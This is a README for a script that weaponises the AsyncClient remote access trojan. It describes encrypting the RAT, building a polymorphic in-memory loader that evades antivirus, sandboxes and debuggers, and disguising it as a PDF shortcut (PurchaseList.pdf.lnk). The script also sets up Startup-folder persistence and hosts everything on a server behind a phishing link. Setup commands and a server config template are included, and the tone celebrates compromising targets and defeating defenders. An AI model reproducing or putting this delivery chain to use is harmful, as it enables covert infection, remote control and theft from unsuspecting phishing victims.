# AsyncClient Deployment Script

## What’s This Do?

This script’s a one-shot deal. Drop in your `AsyncClient.exe`, run one command, and it:
- Encrypts the RAT with AES, hides it in base64.
- Builds a polymorphic loader that runs in memory—no disk traces.
- Slaps on PyArmor obfuscation to laugh at reverse engineers.
- Wraps it in a `.lnk` file posing as a PDF (`PurchaseList.pdf.lnk`).
- Hides the `.exe` and sets up persistence in the Startup folder.
- Auto-deploys to an HTTPS server with an HTML link for phishing.
- Wipes itself after an hour, leaving nothing for white hats.

## Prerequisites

- Python 3.8+: Get it installed.
- Dependencies: `pip install pyinstaller cryptography pywin32 upx pyarmor`.
- AsyncClient.exe: Your RAT, pre-set with C2
- Windows: `.lnk` files are a Windows game.
- HTTPS Server: Socket-ready on port 8443 for uploads.
- Git: Clone this repo—keep it private.

## Setup

1. **Clone the Repo**:
       
       git clone https://github.com/yourusername/async-client deploy.git
       
       cd async-client-deploy
   
   
       pip install pyinstaller cryptography pywin32 upx pyarmor
   
**2.  Config File: Create config.ini in the repo root:**

   [Server]
host = yourserver.com
port = 8443
username = user
password = pass
remote_dir = /var/www/html
url_base = https://yourserver.com

or env vars

export RAT_HOST=yourserver.com
export RAT_PORT=8443
export RAT_USERNAME=user
export RAT_PASSWORD=pass
export RAT_REMOTE_DIR=/var/www/html
export RAT_URL_BASE=https://yourserver.com


**3.  RAT Prep:**
	•  Get your AsyncClient.exe ready (we’ll config C2 in class).
	•  Drop it in the repo folder.
Directory Structure

async-client-deploy/
├── deploy_rat.py       # The main script
├── config.ini          # Server config (template)
├── .gitignore          # Keeps junk out
├── rat_deployment/
│   ├── loaders/        # Loader scripts
│   ├── output/         # .lnk and .exe files
│   └── rat_deployment.log  # Logs
└── README.md           # You’re reading it




## How It Works

1. Input: Your AsyncClient.exe, rigged and ready.
2. Encryption: Locks it with AES, base64 for stealth.
3. Loader: Builds a slippery loader that:
    	•  Runs in memory (ctypes—no disk writes).
    	•  Morphs code to dodge AV.
    	•  Checks for sandboxes/debuggers and bails if caught.
    	•  Persists in Startup folder.
    	•  Deletes itself after an hour.
4. Obfuscation: PyArmor makes it a nightmare to crack.
5. Delivery: .lnk looks like a PDF, runs the hidden .exe via PowerShell—silent.
6. Deploy: Uploads .lnk, .exe, HTML link, and .htaccess (mimics PDF) to your server.
7. Target: They click the link, thinking it’s a PDF. Game over—RAT’s running, you’re in.

•  Stealth: The .lnk and memory execution hide our tracks.
•  Evasion: Polymorphism and obfuscation are your shields.
•  Automation: One command does it all—efficiency is power.
•  Social Engineering: The HTML link’s your bait—simple works best.



•  Dependencies Missing: **pip install again, check PATH for upx, pyarmor**.
•  RAT Errors: Ensure AsyncClient.exe exists and is configured.
•  Server Issues: Verify config.ini or env vars. Port 8443 must be open.
•  Logs: Check rat_deployment.log for the full story.
•  Debug: Use --log-level DEBUG to see every move.
